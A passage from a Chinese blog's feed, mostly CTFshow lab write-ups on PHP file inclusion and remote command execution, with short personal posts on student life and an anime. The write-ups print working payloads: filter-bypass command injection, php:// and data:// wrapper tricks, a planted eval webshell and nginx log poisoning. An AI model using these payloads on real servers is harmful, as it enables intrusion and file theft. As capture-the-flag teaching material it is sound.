punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>    t1<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>    t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    READ<span class="token punctuation">(</span>session<span class="token punctuation">)</span></code></pre><h4 id="web83"><a href="#web83" class="headerlink" title="web83"></a>web83</h4><p>条件竞争同上</p><h4 id="web84"><a href="#web84" class="headerlink" title="web84"></a>web84</h4><p>添加了如下代码</p><p>system(“rm -rf &#x2F;tmp&#x2F;*”);</p><p>&#x2F;&#x2F; 在 rm -rf &#x2F;tmp&#x2F;* 执行之后立刻有新的请求创建了 sess_shell 文件 条件竞争依然有效</p><h4 id="web85"><a href="#web85" class="headerlink" title="web85"></a>web85</h4><p>添加了一个内容识别，如果有<code>&lt;</code>就die，依旧可以竞争。</p><h4 id="web86"><a href="#web86" class="headerlink" title="web86"></a>web86</h4><p>dirname(<strong>FILE</strong>)表示当前文件的绝对路径。set_include_path函数,是用来设置include的路径的，就是include()可以不提供文件的完整路径了。<br>include文件时,当包含路径既不是相对路径，也不是绝对路径时(如:include(“test.php”))，会先查找include_path所设置的目录。<br>脚本里用的是完整路径，不影响竞争。</p><h4 id="web87-file-put-contents"><a href="#web87-file-put-contents" class="headerlink" title="web87(file_put_contents)"></a>web87(file_put_contents)</h4><pre class="language-php" data-language="php"><code class="language-php">if(isset($_GET['file']))&#123;    $file = $_GET['file'];    $content = $_POST['content'];    $file = str_replace("php", "???", $file);    $file = str_replace("data", "???", $file);    $file = str_replace(":", "???", $file);    $file = str_replace(".", "???", $file);    file_put_contents(urldecode($file), "<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'大佬别秀了'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>".$content);&#125;</code></pre><p>file_put_contents() 函数把一个字符串写入文件中。</p><p><a href="https://www.runoob.com/php/func-filesystem-file-put-contents.html">PHP file_put_contents() 函数</a></p><p><a href="https://xz.aliyun.com/t/8163?time__1311=n4+xuDgDBDyGKAKD=D7Dl1oQ447wWhSwi2iD&alichlgref=https://xz.aliyun.com/t/8163#toc-3">file_put_content和死亡·杂糅代码之缘</a></p><p>参考大佬文章，可以使用base64或者rot13来进行对前面代码进行杂糅</p><p>首先构造$file，因为要对file进行一次url解码所以我们对payload进行两次url编码</p><p>晚上大多工具是对英文字符不进行url编码的，所以这里给出脚本方便进行urlencode</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse<span class="token keyword">def</span> <span class="token function">encode_char</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 指定字符集，转换为ASCII码后，再转换为16进制，并添加%</span>    special_chars <span class="token operator">=</span> <span class="token string">"!#$&amp;'()*+,/:;=?@-._~0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>    <span class="token keyword">if</span> char <span class="token keyword">in</span> special_chars<span class="token punctuation">:</span>        <span class="token comment"># 转换为ASCII码，然后转换为16进制，并添加%</span>        <span class="token keyword">return</span> <span class="token string">'%&#123;:02x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token comment"># 对其他字符进行URL编码</span>        <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">url_encode</span><span class="token punctuation">(</span>input_string<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 对字符串中的每个字符进行编码</span>    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>encode_char<span class="token punctuation">(</span>char<span class="token punctuation">)</span> <span class="token keyword">for</span> char <span class="token keyword">in</span> input_string<span class="token punctuation">)</span>input_string <span class="token operator">=</span> <span class="token string">"Test"</span>encoded_string <span class="token operator">=</span> url_encode<span class="token punctuation">(</span>input_string<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>encoded_string<span class="token punctuation">)</span></code></pre><blockquote><p>php:&#x2F;&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;hsad.php</p><p>两次编码后得到</p><p>file&#xp></blockquote><p>然后进行Post content</p><p>base64可以绕过die函数。因为base64编码范围是 <code>0 ～ 9,a ～ z,A ～ Z,+,/ ，</code>所以除了这些字符，其他字符都会被忽略掉。</p><p>base64过滤之后就只有(phpdie)6个字符了，base64要求把每三个8Bit的字节转换为四个6Bit的字节，所以这里也要凑够四个字节的倍数，避免base64解码出问题，这里加上两个字符即可。</p><blockquote><p>​                    <?php system("tac fl0g.php");?></p><p>content&#x3D;aaPD9waHAgc3lzdGVtKCJ0YWMgZmwwZy5waHAiKTs&#x2F;Pg&#x3D;&#x3D;</p></blockquote><h4 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h4><p>发现过滤的还是比较多，但是没有过滤 : 那我们就可以使用PHP伪协议就是 这里使用的是 data:&#x2F;&#x2F;text&#x2F;plain;base64,poc 其实和79差不多 只是注意的是编码成base64的时候要去掉 ＝</p><h4 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h4><p>访问网页给了视频，formost分解出来有图片是网站源码</p><p><img src="web116.png" loading="lazy"></p><p>然后直接访问flag.php就行，说实话有点懵，因为过滤挺狠的</p><h4 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h4><p>参考文章：</p><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php:&#x2F;&#x2F;filter的妙用</a></p><p><a href="https://blog.csdn.net/qq_44657899/article/details/109300335">php:&#x2F;&#x2F;filter的各种过滤器</a></p><p>这道题过滤了rot13，base64，string等一些过滤器的内容，那换其他过滤器不就完事了。</p><p>这里我们用<code>convert.iconv.*</code>这个过滤器。</p><p>payload：</p><blockquote><p>GET: ?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.ucs-2be.ucs-2le&#x2F;resource&#x3D;a.php</p><p>从<code>UCS-2LE</code>编码转换为<code>UCS-2BE</code>编码</p><p>POST: contents&#x3D;?&lt;hp pvela$(G_TE’[‘a)] ;&gt;?</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>byeSophomore</title>
      <link href="/2024/06/26/byeSophomore/"/>
      <url>/2024/06/26/byeSophomore/</url>
      
        <content type="html"><![CDATA[<p>端午回来的那天下午不小心骨折了，刚刚完成了课设，除了开学的缓考外，对我来说，大学生活已经悄然过半</p><p>说起来也挺碌碌无为的，但也不至于一事无成，只是觉得还不够。对于未来的规划，坦白说我只想老老实实上个班赚钱，大家都想赚得多，因为这样才有资格赎回属于自己的一点自由，但也挺迷茫，因为确实没想好具具体体的方向。</p><blockquote><p>空虚的勉励和油腻的鸡汤一样令我反胃，如果一个人能轻易地通过几句文字得到十足的动力，这个人恐怕也单纯无脑而易于受到利用；而远大深刻真正有效的激励，却是一段话无法表达、表达后也无所裨益的：写出来只是给别人看的表决心，又不能深化这一激励。这一类的文字，要么只是流于形式的敷衍，要么就是浅薄的表露。</p></blockquote><p>总之还得去做吧，空想倒也没什么用，我写这些东西不知道要给谁看，也不知道谁会看到，我表达能力一向很弱，总觉得是读的书太少，所以也没有想着自己写的这点东西能给别人带来什么，就想记录一下吧。</p><p>想了好多，还是算了</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Campus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>可能真的要等好久了</title>
      <link href="/2024/06/17/%E8%BF%99%E4%BC%BC%E4%B9%8E%E6%98%AF%E4%B8%80%E4%B8%AA%E9%97%AD%E7%8E%AF/"/>
      <url>/2024/06/17/%E8%BF%99%E4%BC%BC%E4%B9%8E%E6%98%AF%E4%B8%80%E4%B8%AA%E9%97%AD%E7%8E%AF/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="e522772ea704707720a4ef0bc557a013923c8e9594f20e1e414419ebbbe9f8c7">6b09021c4fad842555217a8d07b3963feb852d3e21f8742f65fcd76a470d0bd132968d4640d394f9980075d76c1e54c55906bfeeb9d4b19a98ae91997175b4116f505795b7b910c3386a65db4722adc0cc05a4478c6a9bd4bc6e5b8233db3a139e6d31da6c7ea1cbea42884836829b6c085f5664568bc6ea1c32e141417bb618db4bb820f58414f39ada0f9301699f332f2d8ba91c4d9f00f587dfdd8cc25a9e1ba7e869aab6ca7897472cceec9c42aa5653556e963006430dd7ae93240198851e4c49c871bc97ab7c376e51e2a240f54137f454c6298e4c6cbc9ce8f28b83e42547ae361e88c61836a6f71400a33085d0aca6fa807d8e11bbf2dcd6962b286af488105934d22a04e9f2e0d96ebe14597baa789a4753c60d6d2737814d39d02a94c010763760ed4ab4d9c98a3ef4da26e48bae060cfd1a357e3f3f740da5b486e0604b5ad6ed6762c499a7ea8b843448c893679f123443b4998bde3cf7fd4145b6cef62f81d7d93737020320b0e23541555e880fea8707bb86efc5eb301b980d68362000fba23912338cfbc222360f316c5b26a09297697f0b442300a185fc224540ed14d4f6b9b56c2c90f2ccf70875ec7d2f03aa2b1cc2c4d1f01772d14154ffa797f4247e153da0f8b87550482fc337a7e7b2701c4e7180282ec6fc05cb25c71bfe2b3ca63a95e6bfa153832774b1da60405909979bbdadaccd13874f3d3bbc1506612118e8111ac08adfb6f4944da15f0d93e3e18cf22f942eef8640a5e921f340c074d93efa9ce303824ea2c2173c750b03d0ca025bdde24e3287f71e083c4dc81abfd7fd51f91600d50ca94a76a778bb4fd5f71fd66cd3f639ff2e4a4331ff5fc177482301680bb501c3aa8b25b079ed9a63752ed5abf85e1fdf4ae54fc04acac0e54b928cc7eb39fc987a11bba9050655b470f3fb2a159deea5e1ca7d573acce7c7f4a5250bc3249e4487c73f7a8ed7067d3dd09e6871dd0d448ed358c388430538ad145d5cfaaa472a7b7553d73281fa7aad8037dfdeb00aa2f53b3bb83b1fdfdb7a99749d58f2ce97369c95ab5561e7406501a9463e9f74f293dae82484bf02cd92e0ca53a6e307bcd513d26069177efad396a4628d4eeeb9c642d5211abc1ac9cd63eb1c6b3e1aef02390bf3e1dbc531fd2d3850f5a6397759de2bf295fd9068a3b7afb5cd1ff3f910e80d6c5ab4812c64688e7c9694b721c7e5c1ab547a11eafbbb71b30899639877c2b10719dcdf3ac1f215ea733cebacab4f4d019c6efbc82d4e474c076d65fc3c063e055be71425c0dcab0d48e1da8cb659adecb2ec4489fc0aa71d71613ffd694955df279aca61fd267d4ae1be23e399c0dca1df15aa793a02997fbeb87cc019e1bab7b78ea55e14783ad10f9b9508eb44314c89aac04aac3ae7f06e7b0897c5b79ed5829c064fa10e5db82d616ab1e9d82e253dc99d0bb8b3f868a0ba6f583f46335a49923edaf0c629c2fd85e87425fa40e6ad7f72a5174bc640dded86cad62e17cf2f75dde1c4e1519a30da2dd7dafc129992eaf346da628941bfe2404dc1471fde14548edf1fa018774df7f99c8f9094b05c7767b77cbc019ab4ab4d195afa0a50b0bc5063c3b6343a157d63ab54e10d084c861e2015e47e68ffda2d10cc0b79298b8f4a7c4b9d046ec861a32246220f1b46489b762a85f1d7d1f6488424d89b80d43f312f2b84232b0bcaced24921db52222da9ece94827544c8dfecf8790186634a966ec60c48fb5e0b7ee49b1ec97e5780c9a1497a3264a912483377f3a6cff979a0cf358c6d807627f1b490a41819be1e5ebfd4945c7d494b7f68eac8f8aeeae61697c3aaad07326063dd7a84b9b35f3c1fe2599ecd6c4080e3cc6e456555c68b10069f9dc4aa73c204b18290c2d9a7f4b28ef9acfa4bca8fa735f76da9f02cacb54913fd480204f5f33c2b636008571647a7e5d1d1ed8631fce3e9a5709260cb0c829586b556c5d175a6d2a72e6351d8ff252febae745c979657e7d276bc23ff0ab34a5f22445af1127d283e71ca7b3a84761334dc1d408944f66dea2647ab335cb1bb70da8143ce73711d8c77d59a29b14d42be38386f94ea7e2ee82cbfc155fae65db97f537970539391d0da75435d3b28c0b4dc7fc2cd732ccc48b024d9b87c605de90e0b7ef38e55195100a547d826cfa7159597a823577ce716ef8919ac4297a312bcb0c073b3146c3d66952756fb43cb4b37614dd0545f2ae17319a33fc1cf3fd3574b7c1cc3f04f76d93ac7aa564e3e6be54d8eaf86b784a48cbcf4420fb24692206291e3ce9a6bfac560c6c87473d68d778f792e8ced1f58c30c9f4b5d0542736606ed396f509a5810a4d20be921ab88e3c3c244bbb52a48fa92b33bdd4d9e69bfc7a875e46c6afc3f9312997af870cc69b9d81e3b0ac691c1afbbbc6c920729ebdacbdc487caf18a1a247768909f0cad6074b695cd9bcd7c3cae0c5aea4fc39c15c119bb893afefdcc703c8add147c7eb886b3197fb570e2472d07302d14fb13ee4e834d07f689c1082925bbb3d3d22bda707719c939c364faf76794a2656322958e904460a9f0b43090dcfb60a6ae7e9555916b662aadda62fbb96e70a8a16436ae100788e1cca5e9</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Maybe have a guess</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 碎碎念 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CyberPunk</title>
      <link href="/2024/06/05/CyberPunk/"/>
      <url>/2024/06/05/CyberPunk/</url>
      
        <content type="html"><![CDATA[<p><img src="1.png" alt="CyberPunk" loading="lazy"></p><p><img src="2.png" loading="lazy"><em>Lucy带David第一次来月球</em></p><p>之前有很多朋友安利过，看到很多同学喜欢这个动漫，看完后不出意料的非常好看 </p><p>最打动我的当然是Lucy和David，David从第一次被Lucy带进月球，就一直记得Lucy最想去月球了，Lucy为了保护David一直在不顾危险的默默的付出，尽管最后并不是完美的结局，不过感动我的是他们存在于细枝末节的温柔。</p><p>当然，不止他们，还有很多令人难忘的角色和出色独特背景设定。</p><p>在大多数科技被顶层垄断的时候，每个人都生活在监控之下，他们是一群游离在社会底层和城市边缘的<em><strong>赛博朋克</strong></em>，他们的梦想可能是自由吧，不过渴求自由似乎太过奢望，不过他们以及很多伙伴都有着属于Cyberpunk的浪漫</p><p>动漫中的Bgm也同样好听：<em>I Really Want to Stay at Your House</em></p><p><strong>一些壁纸↓↓↓</strong></p><p><img src="3.png" alt="Lucy" loading="lazy"></p><p><img src="4.png" alt="Lucy" loading="lazy"></p><p><img src="5.png" alt="Lucy" loading="lazy"><em>Crazy but beautiful</em></p><p><img src="6.png" alt="David和Lucy🥰" loading="lazy"></p><p><img src="7.png" alt="David&#39;s mom" loading="lazy"><em>David的麻麻😭</em></p><p><img src="8.png" alt="Rebecca" loading="lazy"><em>非常可爱的小女孩</em></p><p><img src="9.png" alt="Rebecca" loading="lazy"></p><p><img src="10.png" alt="Cyberpunk" loading="lazy"><em>大合照</em></p><p><strong>这个世界上没有任何人能完全信任，除了你自己。</strong></p><p><img src="14.png" alt="David" loading="lazy"></p><p><strong>对不起，我们不能一起上月球了。</strong></p><p><img src="11.png" loading="lazy"><em>David的遗言😭😭😭</em></p><p><strong>赛博朋克不都是在逃避某种可耻人生的逃难者，或是抱着遥远志向而迷失自我的逐梦者吗 ？</strong></p><p><img src="12.png" alt="Kiwi" loading="lazy"><em>酷酷的kiwi</em></p><p><strong>回顾过去没有意义。</strong></p><p><img src="13.png" alt="David" loading="lazy"></p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Anime </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web入门-rce</title>
      <link href="/2024/06/03/web%E5%85%A5%E9%97%A8-rce/"/>
      <url>/2024/06/03/web%E5%85%A5%E9%97%A8-rce/</url>
      
        <content type="html"><![CDATA[<h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><h4 id="用于命令执行的常见姿势"><a href="#用于命令执行的常见姿势" class="headerlink" title="用于命令执行的常见姿势"></a>用于命令执行的常见姿势</h4><p>system</p><p>exec</p><p>passthru</p><p>shell_exec</p><p>include(文件包含漏洞，配合php伪协议)</p><h4 id="一些常见的绕过方式"><a href="#一些常见的绕过方式" class="headerlink" title="一些常见的绕过方式"></a>一些常见的绕过方式</h4><h5 id="Windows支持："><a href="#Windows支持：" class="headerlink" title="Windows支持："></a>Windows支持：</h5><p>|直接执行后面的语句 ping 127.0.0.1|whoami<br>||前面出错执行后面的 ，前面为假 ping 2||whoami<br>&amp; 前面的语句为假则直接执行后面的,前面可真可假 ping 127.0.0.1&amp;whoami<br>&amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真 ping 127.0.0.1&amp;&amp;whoami</p><p>%0a 回车</p><p>%1a 作为.bat文件的命令分隔符</p><h5 id="Linux支持"><a href="#Linux支持" class="headerlink" title="Linux支持:"></a>Linux支持:</h5><p>;前面的执行完执行后面的 ping 127.0.0.1;whoami<br>|管道符，显示后面的执行结果 ping 127.0.0.1|whoami<br>||当前面的执行出错时执行后面的 ping 1||whoami<br>&amp; 前面的语句为假则直接执行后面的,前面可真可假 ping 127.0.0.1&amp;whoami<br>&amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真 ping 127.0.0.1&amp;&amp;whoami</p><p>%0a 回车</p><p>%0d 换行</p><h5 id="过滤空格绕过"><a href="#过滤空格绕过" class="headerlink" title="过滤空格绕过"></a>过滤空格绕过</h5><p>使用&lt;代替空格</p><p>使用${IFS}代替空格</p><blockquote><p>IFS变量的相关信息：</p><ul><li>Shell把变量IFS内的每一个字符都当做是一个分割符(delimeter)，用这些字符作为每一个字段的结束符来进行分割。</li><li>如果IFS没有设置，或者IFS的值被设置为”\t\n”(space, tab和 newline)，那么操作对象的开始和结束处的所有space, tab和newline序列都将被忽略，但是操作对象中间的space, tab和newline序列会作为界定符工作。</li><li>如果IFS值不是默认值(例如程序中对IFS进行设置过)，只有出现在IFS内的空白字符(可能是space, tab或newline中的一个或几个)才会在单词开始和结束处被忽略，这里说的是单词，而不是整个操作对象。</li><li>IFS内的非空白字符多个连续出现时，每个非空白字符会被当做单独的分隔符看待，但是多个连续的空白字符会被当做一个分隔符看待。</li><li>如果IFS为空(“null”)，则不会进行单词分割。</li></ul></blockquote><p>使用$IFS代替空格</p><h5 id="过滤斜杠-绕过"><a href="#过滤斜杠-绕过" class="headerlink" title="过滤斜杠&#x2F;绕过"></a>过滤斜杠&#x2F;绕过</h5><p>使用${HOME:0:1}代替</p><h5 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h5><p>PHP 伪协议是 PHP 支持的协议与封装协议，几个 PHP 支持的伪协议如下。</p><table><thead><tr><th>伪协议</th><th>功能</th></tr></thead><tbody><tr><td>file:&#x2F;&#x2F;</td><td>访问本地文件系统</td></tr><tr><td>http:&#x2F;&#x2F;</td><td>访问 HTTP(s) 网址</td></tr><tr><td>php:&#x2F;&#x2F;</td><td>访问各个输入&#x2F;输出流</td></tr><tr><td>phar:&#x2F;&#x2F;</td><td>PHP 归档</td></tr><tr><td>zip:&#x2F;&#x2F;</td><td>压缩流</td></tr></tbody></table><p>例如在 allow_url_include &#x3D; on 时服务器上有个文件叫 index.php，且存在文件包含漏洞，这个时候就能用 php 伪协议直接把文件显示出来。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=index.php</span></code></pre><p>稍微解释下这个做法，php:&#x2F;&#x2F;filter&#x2F; 是一种访问本地文件的协议，&#x2F;read&#x3D;convert.base64-encode&#x2F; 表示读取的方式是 base64 编码后，resource&#x3D;index.php 表示目标文件为index.php。问什么要进行 base64 编码呢？如果不进行 base64 编码传入，index.php 就会直接执行，我们就看不到文件中的内容了。php 协议还常用 php:&#x2F;&#x2F;input，这可以访问请求的原始数据的只读流，可以读取 POST 请求的参数。</p><h5 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data 伪协议"></a>data 伪协议</h5><p>php 5.2.0 起，数据流封装器开始有效，主要用于数据流的读取，如果传入的数据是PHP代码就会执行代码。使用方法为:</p><pre class="language-none"><code class="language-none">data:&#x2F;&#x2F;text&#x2F;plain;base64,xxxx(base64编码后的数据)</code></pre><h5 id="无回显命令执行"><a href="#无回显命令执行" class="headerlink" title="无回显命令执行"></a>无回显命令执行</h5><p>1.tee 从标准输入读取，再写入标准输出和文件。</p><p>2.反弹shell</p><p>3.dnslog外带</p><h5 id="下划线的正则绕过"><a href="#下划线的正则绕过" class="headerlink" title="下划线的正则绕过"></a>下划线的正则绕过</h5><p> 这个正则的绕过方法就是利用特性来绕过，可以用</p><p>　[</p><p> (空格)</p><p> + 　</p><p> .</p><p>上面那几个字符任何一个都行，都可以被处理成_</p><h3 id="web29-124"><a href="#web29-124" class="headerlink" title="web29-124"></a>web29-124</h3><h4 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h4><p>只是过滤了简单的flag字符，直接使用system函数</p><p>Payload:</p><blockquote><p>1、用egrep效果一样egrep&#x3D;grep  -E<br>c&#x3D;system(“cat fl<em>g.php | grep  -E ‘fl.g’ “);<br>2、此种方式需要右键源代码<br>c&#x3D;system(“cat fl</em>g.php”);<br>3、</p><p>c&#x3D;system(“tac fl<em>g.php”);<br>4、倒序输出文本<br>c&#x3D;system(“tac fl</em>ag.php”);<br>5、<br>c&#x3D;system(“cp fl*g.php a.txt “);<br>访问&#x2F;a.txt<br>6、直接输出一个php这样就可以直接利用代码了,注意也是右键查看源代码<br>c&#x3D;system(‘echo -e “ &lt;?php \n error_reporting(0); \n  $c&#x3D; $_GET[&#39;c&#39;]; \n eval($c); “ &gt; a.php’);<br>&#x2F;a.php?c&#x3D;system(“tac flag.php”);</p></blockquote><h4 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h4><p>过滤了system函数，可以用反引号来命令执行</p><p>Payload:</p><blockquote><p>1、nl命令，带着行号输出文本内容<br>c&#x3D;echo <code>nl fl&#39;&#39;ag.p&#39;&#39;hp</code>;<br>echo <code>cat fl&#39;&#39;ag.p&#39;&#39;hp</code>;<br>echo <code>cat fl*ag.p*hp</code>;<br>echo <code>cp fl*ag.p*hp 1.txt | cat 1.txt</code>;<br>单引号：引号里面的内容会原封不动的显示出来（很简单，不做解释）<br>双引号：里面的特殊符号会被解析，变量也会被替换（\ 符号、空格会被解析）<br>echo \a -&gt; a<br>echo “\a” -&gt; \a<br>2、passthru函数，同system，同理exec，shell_exec也可以用，不过有点麻烦<br>c&#x3D;passthru(“cat fla*”);<br>c&#x3D;exec(passthru(“cat fla*”));<br>c&#x3D;shell_exec(passthru(“cat fla*”));</p></blockquote><h4 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h4><p>题目过滤了空格，单引号，小数点，</p><p>过滤了空格，可以使用%09替代；也可以使用{$IFS}，因为单引号被过滤了，所以如果使用c&#x3D;passthru(“cat%09fla*”);或者{$IFS}都不会被解释为空格</p><p>所以构造如下Payload:</p><blockquote><p>1、使用eval嵌套。具体参数：passthru 结合%09，也可以直接rce，因为没有对其他参数进行过滤<br>其中%09绕过空格 ?c&#x3D;eval($_GET[1]);&amp;1&#x3D;passthru(“tac%09fla*”); 这里需要注意括号的闭合，&amp;的连接。<br>2、使用参数：passthru结合 $IFS$9<br>其中$IFS$9绕过空格，注意转义$符号 ?<br>$9是当前系统shell进程的第九个参数的持有者，它始终为空字符串。c&#x3D;eval($_GET[1]);&amp;1&#x3D;passthru(“tac$IFS$9fla*”);<br>3、使用未被过滤的命令。passthru直接读取<br>?c&#x3D;passthru(%22tac$IFS$9fla*%22); 也就是passthru(“tac$IFS$9fla*”);<br>4、使用pos(localeconv)来获取小数点<br>localeconv可以返回包括小数点在内的一个数组；pos去取出数组中当前第一个元素，也就是小数点。 scandir可以结合它扫描当前目录内容。 ?c&#x3D;print_r(scandir(pos(localeconv()))); 可以看到当前目录下有flag.php 通过array_reverse把数组逆序，通过next取到第二个数组元素，也即flag.php 然后?c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));</p></blockquote><h4 id="web32-nginx日志注入"><a href="#web32-nginx日志注入" class="headerlink" title="web32(nginx日志注入)"></a>web32(nginx日志注入)</h4><p>过滤掉了flag|system|php|cat|sort|shell|.| |’|&#96;|echo|;|( 包括点，单引号，反引号，分号，括号</p><p>所以这里需要使用include来构造Payload:</p><blockquote><p>1、?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php<br>其中?&gt;代替分号，页面会显示flag.php内容的base64编码，解码即可获取flag<br>还有一种方法，日志注入<br>2、?c&#x3D;include$_GET[1]?%3E&amp;1&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<br>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log是nginx默认的access日志路径，访问该路径时，在User-Agent中写入一句话木马，然后用中国蚁剑连接即可</p><p>3、?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;input</p><p>也可以使用php:&#x2F;&#x2F;input然后使用post执行命令<?php system("cat flag.php")?></p></blockquote><h4 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h4><p>相比上一关只多过滤了“</p><p>所以web32Payload依旧适用</p><h4 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h4><p>多过滤一个:  之前payload依旧适用</p><h4 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h4><p>多过滤一个&#x3D; &lt;   之前payload依旧适用</p><h4 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h4><p>多过滤了数字  GET参数改为a即可</p><h4 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>preg <span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span>，<span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><blockquote><p>1、使用php:&#x2F;&#x2F;input POST写入php代码</p><?php system("cat fla*")?><p>2、使用data协议</p><p>c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4&#x3D;</p><?php system("tac flag.php")?></blockquote><h4 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h4><p>web37Payload照样打</p><h4 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> </code></pre><p>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php%20system("tac fla*.php");?><br>?&gt;为php结束符号，后面拼接的.php会被忽略掉，不用管</p><h4 id="web40-数组函数"><a href="#web40-数组函数" class="headerlink" title="web40(数组函数)"></a>web40(数组函数)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\'|\"|\,|\&lt;|\.|\>|\/|\?|\\\\/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     </code></pre><p>这次添加了很多过滤，之前方法大多都不行了</p><blockquote><p>1、c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv()))))); 或者 